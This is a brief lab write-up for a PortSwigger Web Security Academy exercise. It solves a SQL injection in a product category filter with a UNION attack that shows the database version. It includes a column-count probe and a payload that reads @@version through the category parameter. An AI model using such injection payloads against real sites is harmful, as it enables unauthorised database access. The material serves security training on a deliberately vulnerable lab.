
# #PortSwigger 


![[Pasted image 20251212195045.png]]


## Lab Description

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

**Objective:** Display the database version string.

---
---

### Step 1: Capture the Category Filter Request

1. In Burp's browser, access the lab
2. Click on a product category filter (e.g., "Gifts")
3. In Burp Proxy, find the request

**Example request:**
```
GET /filter?category=Gifts HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

---

### Step 2: Determine Number of Columns

**Test with `UNION SELECT`:**
```
GET /filter?category=' UNION SELECT 1,2 # HTTP/1.1
```

**Response:**
![[Pasted image 20251212195805.png]]



---

### Step 3: Retrieve Database Version

**Payload (MySQL/Microsoft SQL Server):**
```
GET /filter?category=' UNION SELECT @@version, NULL # HTTP/1.1
```

**Response:**
![[Pasted image 20251212195914.png]]

**The version string is displayed in the response.**

---

### Step 4: Lab Solved

![[Pasted image 20251212195931.png]]



---
---

